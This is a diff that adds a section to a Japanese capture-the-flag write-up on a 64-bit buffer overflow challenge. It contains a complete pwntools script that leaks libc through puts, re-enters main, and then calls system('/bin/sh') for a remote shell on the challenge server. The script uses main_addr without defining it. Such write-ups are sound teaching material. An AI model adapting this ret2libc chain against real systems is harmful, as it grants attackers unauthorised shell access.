@@ -193,3 +193,68 @@ offset_str_bin_sh = 0x18cd57
 # Exploit 
 
 systemのアドレスがわかるので、*offset_system*から**libc_base**が判明する (`libc_base = system_addr - offset_system`)
+libc_baseが判明した後は、mainにもう一度突入すれば判明したlibc_baseを変えることなくもう一度実行できる
+
+```console
+gef> x/x main
+0x4006a1 <main>:	0x80c48348e5894855
+```
+
+スクリプトは以下
+`r.recvall(timeout=5)`では失敗したので、for-loopを回しながら`r.recvline(timeout=1)`をする
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+offset___libc_start_main_ret = 0x20830
+offset_system = 0x0000000000045390
+offset_dup2 = 0x00000000000f7970
+offset_read = 0x00000000000f7250
+offset_write = 0x00000000000f72b0
+offset_str_bin_sh = 0x18cd57
+
+popret = 0x0000000000400763
+puts_plt = 0x0000000000400520
+system_got = 0x601028
+puts_got = 0x601018
+gets_got = 0x601040
+
+# Stage 1: Leak libc_base then enter main again
+buf = ''
+buf += 'A'*136
+buf += p64(popret)
+buf += p64(system_got)
+buf += p64(puts_plt)
+buf += p64(main_addr)
+
+r = remote('pwn1.chall.beginners.seccon.jp', 18373)
+r.recvuntil('Input Content : ')
+r.sendline(buf)
+a = ''
+for i in range(10):
+    a += r.recvline(timeout=1)
+
+spl = a.split('\n')
+addr = spl[-2]
+system = u64(addr + ('\x00'*(8 - len(addr))))
+libc_base = system - offset_system
+# Calculate /bin/sh address from libc_base and offset
+binsh = libc_base + offset_str_bin_sh
+print 'system   :', hex(system)
+print 'libc_base:', hex(libc_base)
+print 'binsh    :', hex(binsh)
+print 'popret   :', hex(popret)
+
+# Stage 2: Execute system("/bin/sh")
+another_buf = ''
+another_buf += 'A'*136
+another_buf += p64(popret)
+another_buf += p64(binsh)
+another_buf += p64(system)
+
+r.recvuntil('Input Content : ')
+print '[@] RETURNED TO main'
+r.sendline(another_buf)
+r.interactive()
+```
